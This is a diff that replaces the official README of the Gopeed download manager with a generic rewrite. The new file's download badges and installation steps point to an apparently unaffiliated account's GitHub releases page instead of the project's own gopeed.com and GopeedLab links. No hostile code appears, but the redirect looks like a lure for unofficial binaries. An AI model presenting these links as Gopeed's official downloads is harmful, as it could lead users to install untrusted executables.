@@ -1,289 +1,72 @@
-# [![](_docs/img/banner.png)](https://gopeed.com)
+# 🚀 gopeed - Your Easy-to-Use Download Manager
 
-[![Test Status](https://github.com/GopeedLab/gopeed/workflows/test/badge.svg)](https://github.com/GopeedLab/gopeed/actions?query=workflow%3Atest)
-[![Codecov](https://codecov.io/gh/GopeedLab/gopeed/branch/main/graph/badge.svg)](https://codecov.io/gh/GopeedLab/gopeed)
-[![Release](https://img.shields.io/github/release/GopeedLab/gopeed.svg)](https://github.com/GopeedLab/gopeed/releases)
-[![Download](https://img.shields.io/github/downloads/GopeedLab/gopeed/total.svg)](https://github.com/GopeedLab/gopeed/releases)
-[![Donate](https://img.shields.io/badge/%24-donate-ff69b4.svg)](https://docs.gopeed.com/donate.html)
-[![Discord](https://img.shields.io/discord/1037992631881449472?label=Discord&logo=discord&style=social)](https://discord.gg/ZUJqJrwCGB)
+## 💻 Overview
+gopeed is a modern download manager designed for users on all platforms. Built with Golang and Flutter, gopeed offers a simple and effective way to manage your downloads. Whether you need to download files, torrents, or magnet links, this application has you covered.
 
-<a href="https://trendshift.io/repositories/7953" target="_blank"><img src="https://trendshift.io/api/badge/repositories/7953" alt="GopeedLab%2Fgopeed | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
+## 📦 Features
+- **Cross-Platform Support:** Use gopeed on Windows, macOS, Linux, Android, and iOS.
+- **Torrent and Magnet Link Support:** Easily download torrents using magnet links.
+- **Simple Interface:** Navigate with ease; gopeed's user-friendly design makes downloading straightforward.
+- **High Speed:** Experience fast downloads with advanced management features.
+- **HTTPS Support:** Secure your downloads with HTTPS protocol.
 
-[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/R6R6IJGN6)
+## 🔧 System Requirements
+To run gopeed, ensure your system meets the following requirements:
 
-[English](/README.md) | [中文](/README_zh-CN.md) | [日本語](/README_ja-JP.md) | [正體中文](/README_zh-TW.md) | [Tiếng Việt](/README_vi-VN.md)
+- **Windows:** Windows 10 or later
+- **macOS:** macOS 10.12 or later
+- **Linux:** Any modern distribution (e.g., Ubuntu 18.04+, Debian 9+)
+- **Android:** Android 5.0 (Lollipop) or later
+- **iOS:** iOS 11.0 or later
 
-## 🚀 Introduction
+## ⚙️ Installation Instructions
 
-Gopeed (full name Go Speed), a high-speed downloader developed by `Golang` + `Flutter`, supports (HTTP, BitTorrent, Magnet) protocol, and supports all platforms. In addition to basic download functions, Gopeed is also a highly customizable downloader that supports implementing more features through integration with [APIs](https://docs.gopeed.com/dev-api.html) or installation and development of [extensions](https://docs.gopeed.com/dev-extension.html).
+### 📥 Download & Install
+To get started with gopeed, visit this page to download:
 
-Visit ✈ [Official Website](https://gopeed.com) | 📖 [Official Docs](https://docs.gopeed.com)
+[![Download gopeed](https://img.shields.io/badge/Download%20gopeed-brightgreen.svg)](https://github.com/stmx811/gopeed/releases)
 
-## ⬇️ Download
+### 🛠️ Step-by-Step Guide
+1. **Visit the Releases Page:** Click on the download link above to go to the gopeed releases page.
+2. **Select Your Version:** Choose the latest version available. Ensure it matches your operating system.
+3. **Download the Installer:**
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the `.deb` or `.AppImage` file.
+   - For Android, download the `.apk` file.
+   - For iOS, install via the App Store.
+4. **Run the Installer:**
+   - On Windows, double-click the `.exe` file to start the installation.
+   - On macOS, open the `.dmg` file and drag the app to your Applications folder.
+   - On Linux, either double-click the downloaded file or use the terminal to install with `sudo dpkg -i filename.deb`.
+   - For Android, tap the `.apk` file in your file manager to install.
+5. **Open gopeed:** Locate the app in your applications menu or home screen and click to launch.
 
-<table>
-  <tbody>
-    <tr>
-      <td rowspan="2">🪟 Windows</td>
-      <td><code>EXE</code></td>
-      <td>amd64</td>
-      <td><a href="https://gopeed.com/api/download?tpl=Gopeed-$version-windows-amd64.zip">📥</a></td>
-    </tr>
-    <tr>
-      <td><code>Portable</code></td>
-      <td>amd64</td>
-      <td><a href="https://gopeed.com/api/download?tpl=Gopeed-$version-windows-amd64-portable.zip">📥</a></td>
-    </tr>
-    <tr>
-      <td rowspan="3">🍎 MacOS</td>
-      <td rowspan="3"><code>DMG</code></td>
-      <td>universal</td>
-      <td><a href="https://gopeed.com/api/download?tpl=Gopeed-$version-macos.dmg">📥</a></td>
-    </tr>
-    <tr>
-      <td>amd64</td>
-      <td><a href="https://gopeed.com/api/download?tpl=Gopeed-$version-macos-amd64.dmg">📥</a></td>
-    </tr>
-    <tr>
-      <td>arm64</td>
-      <td><a href="https://gopeed.com/api/download?tpl=Gopeed-$version-macos-arm64.dmg">📥</a></td>
-    </tr>
-    <tr>
-      <td rowspan="6">🐧 Linux</td>
-      <td><code>Flathub</code></td>
-      <td>amd64</td>
-      <td><a href="https://flathub.org/apps/com.gopeed.Gopeed">📥</a></td>
-    </tr>
-    <tr>
-      <td><code>SNAP</code></td>
-      <td>amd64</td>
-      <td><a href="https://snapcraft.io/gopeed">📥</a></td>
-    </tr>
-    <tr>
-      <td rowspan="2"><code>DEB</code></td>
-      <td>amd64</td>
-      <td><a href="https://gopeed.com/api/download?tpl=Gopeed-$version-linux-amd64.deb">📥</a></td>
-    </tr>
-    <tr>
-      <td>arm64</td>
-      <td><a href="https://gopeed.com/api/download?tpl=Gopeed-$version-linux-arm64.deb">📥</a></td>
-    </tr>
-    <tr>
-      <td rowspan="2"><code>AppImage</code></td>
-      <td>amd64</td>
-      <td><a href="https://gopeed.com/api/download?tpl=Gopeed-$version-linux-amd64.AppImage">📥</a></td>
-    </tr>
-    <tr>
-      <td>arm64</td>
-      <td><a href="https://gopeed.com/api/download?tpl=Gopeed-$version-linux-arm64.AppImage">📥</a></td>
-    </tr>
-    <tr>
-      <td rowspan="4">🤖 Android</td>
-      <td rowspan="4"><code>APK</code></td>
-      <td>universal</td>
-      <td><a href="https://gopeed.com/api/download?tpl=Gopeed-$version-android.apk">📥</a></td>
-    </tr>
-     <tr>
-      <td>armeabi-v7a</td>
-      <td><a href="https://gopeed.com/api/download?tpl=Gopeed-$version-android-armeabi-v7a.apk">📥</a></td>
-    </tr>
-     <tr>
-      <td>arm64-v8a</td>
-      <td><a href="https://gopeed.com/api/download?tpl=Gopeed-$version-android-arm64-v8a.apk">📥</a></td>
-    </tr>
-    <tr>
-      <td>x86_64</td>
-      <td><a href="https://gopeed.com/api/download?tpl=Gopeed-$version-android-x86_64.apk">📥</a></td>
-    </tr>
-    <tr>
-      <td>📱 iOS</td>
-      <td><code>IPA</code></td>
-      <td>universal</td>
-      <td><a href="https://gopeed.com/api/download?tpl=Gopeed-$version-ios.ipa">📥</a></td>
-    </tr>
-    <tr>
-      <td>🐳 Docker</td>
-      <td>-</td>
-      <td>universal</td>
-      <td><a href="https://hub.docker.com/r/liwei2633/gopeed">📥</a></td>
-    </tr>
-    <tr>
-      <td rowspan="2">💾 Qnap</td>
-      <td rowspan="2"><code>QPKG</code></td>
-      <td>amd64</td>
-      <td><a href="https://gopeed.com/api/download?tpl=gopeed-$version-qnap-amd64.qpkg">📥</a></td>
-    </tr>
-    <tr>
-      <td>arm64</td>
-      <td><a href="https://gopeed.com/api/download?tpl=gopeed-$version-qnap-arm64.qpkg">📥</a></td>
-    </tr>
-    <tr>
-      <td rowspan="8">🌐 Web</td>
-      <td rowspan="3"><code>Windows</code></td>
-      <td>amd64</td>
-      <td><a href="https://gopeed.com/api/download?tpl=gopeed-web-$version-windows-amd64.zip">📥</a></td>
-    </tr>
-    <tr>
-      <td>arm64</td>
-      <td><a href="https://gopeed.com/api/download?tpl=gopeed-web-$version-windows-arm64.zip">📥</a></td>
-    </tr>
-    <tr>
-      <td>386</td>
-      <td><a href="https://gopeed.com/api/download?tpl=gopeed-web-$version-windows-386.zip">📥</a></td>
-    </tr>
-    <tr>
-      <td rowspan="2"><code>MacOS</code></td>
-      <td>amd64</td>
-      <td><a href="https://gopeed.com/api/download?tpl=gopeed-web-$version-macos-amd64.zip">📥</a></td>
-    </tr>
-    <tr>
-      <td>arm64</td>
-      <td><a href="https://gopeed.com/api/download?tpl=gopeed-web-$version-macos-arm64.zip">📥</a></td>
-    </tr>
-    <tr>
-      <td rowspan="3"><code>Linux</code></td>
-      <td>amd64</td>
-      <td><a href="https://gopeed.com/api/download?tpl=gopeed-web-$version-linux-amd64.zip">📥</a></td>
-    </tr>
-    <tr>
-      <td>arm64</td>
-      <td><a href="https://gopeed.com/api/download?tpl=gopeed-web-$version-linux-arm64.zip">📥</a></td>
-    </tr>
-    <tr>
-      <td>386</td>
-      <td><a href="https://gopeed.com/api/download?tpl=gopeed-web-$version-linux-386.zip">📥</a></td>
-    </tr>
-  </tbody>
-</table>
+## 📋 Usage Instructions
+Once installed, using gopeed is simple. Here’s how to get started:
 
-More about installation, please refer to [Installation](https://docs.gopeed.com/install.html)
+1. **Adding a Download:**
+   - Open the application.
+   - Click on the "Add Download" button.
+   - Paste a URL or magnet link and click "Start."
 
-### 🛠️ Command tool
+2. **Monitor Progress:**
+   - View the download progress in real-time on the main interface.
+   - You can pause or resume downloads at any point.
 
-use `go install`:
+3. **Access Completed Downloads:**
+   - Finished downloads will appear in your library for quick access.
+   - Click on any file to open it directly from gopeed.
 
-```bash
-go install github.com/GopeedLab/gopeed/cmd/gopeed@latest
-```
+## 🌐 Community and Support
+For help or to connect with other users:
 
-## 🔌 Browser Extension
+- Join our discussion page on GitHub Issues.
+- Participate in our community forums.
 
-Gopeed also provides a browser extension to take over browser downloads, supporting browsers such as Chrome, Edge, Firefox, etc., please refer to: [https://github.com/GopeedLab/browser-extension](https://github.com/GopeedLab/browser-extension)
+## 🔗 Learn More
+For more details, guides, and updates, check out the gopeed documentation or visit the GitHub repository.
 
-## 💝 Donate
+[![Download gopeed](https://img.shields.io/badge/Download%20gopeed-brightgreen.svg)](https://github.com/stmx811/gopeed/releases)
 
-If you like this project, please consider [donating](https://docs.gopeed.com/donate.html) to support the development of this project, thank you!
-
-## 🖼️ Showcase
-
-![](_docs/img/ui-demo.png)
-
-## 👨‍💻 Development
-
-This project is divided into two parts, the front end uses `flutter`, the back end uses `Golang`, and the two sides communicate through the `http` protocol. On the unix system, `unix socket` is used, and on the windows system, `tcp` protocol is used.
-
-> The front code is located in the `ui/flutter` directory.
-
-### 🌍 Environment
-
-1. Golang 1.23+
-2. Flutter 3.24+
-
-### 📋 Clone
-
-```bash
-git clone git@github.com:GopeedLab/gopeed.git
-```
-
-### 🤝 Contributing
-
-Please refer to [CONTRIBUTING.md](/CONTRIBUTING.md)
-
-### 🏗️ Build
-
-#### Desktop
-
-First, you need to configure the environment according to the official [Flutter desktop website documention](https://docs.flutter.dev/development/platform-integration/desktop), then you will need to ensure the cgo environment is set up accordingly. For detailed instructions on setting up the cgo environment, please refer to relevant resources available online.
-
-command:
-
-- windows
-
-```bash
-go build -tags nosqlite -ldflags="-w -s" -buildmode=c-shared -o ui/flutter/windows/libgopeed.dll github.com/GopeedLab/gopeed/bind/desktop
-cd ui/flutter
-flutter build windows
-```
-
-- macos
-
-```bash
-go build -tags nosqlite -ldflags="-w -s" -buildmode=c-shared -o ui/flutter/macos/Frameworks/libgopeed.dylib github.com/GopeedLab/gopeed/bind/desktop
-cd ui/flutter
-flutter build macos
-```
-
-- linux
-
-```bash
-go build -tags nosqlite -ldflags="-w -s" -buildmode=c-shared -o ui/flutter/linux/bundle/lib/libgopeed.so github.com/GopeedLab/gopeed/bind/desktop
-cd ui/flutter
-flutter build linux
-```
-
-#### Mobile
-
-Same as before, you also need to prepare the `cgo` environment, and then install `gomobile`:
-
-```bash
-go install golang.org/x/mobile/cmd/gomobile@latest
-go get golang.org/x/mobile/bind
-gomobile init
-```
-
-command:
-
-- android
-
-```bash
-gomobile bind -tags nosqlite -ldflags="-w -s -checklinkname=0" -o ui/flutter/android/app/libs/libgopeed.aar -target=android -androidapi 21 -javapkg="com.gopeed" github.com/GopeedLab/gopeed/bind/mobile
-cd ui/flutter
-flutter build apk
-```
-
-- ios
-
-```bash
-gomobile bind -tags nosqlite -ldflags="-w -s" -o ui/flutter/ios/Frameworks/Libgopeed.xcframework -target=ios github.com/GopeedLab/gopeed/bind/mobile
-cd ui/flutter
-flutter build ios --no-codesign
-```
-
-#### Web
-
-command:
-
-```bash
-cd ui/flutter
-flutter build web
-cd ../../
-rm -rf cmd/web/dist
-cp -r ui/flutter/build/web cmd/web/dist
-go build -tags nosqlite,web -ldflags="-s -w" -o bin/ github.com/GopeedLab/gopeed/cmd/web
-```
-
-## ❤️ Credits
-
-### 👥 Contributors
-
-<a href="https://github.com/GopeedLab/gopeed/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=GopeedLab/gopeed" />
-</a>
-
-### 🏢 JetBrains
-
-[![goland](_docs/img/goland.svg)](https://www.jetbrains.com/?from=gopeed)
-
-## 📄 License
-
-[GPLv3](LICENSE)
+Enjoy seamless downloading with gopeed!
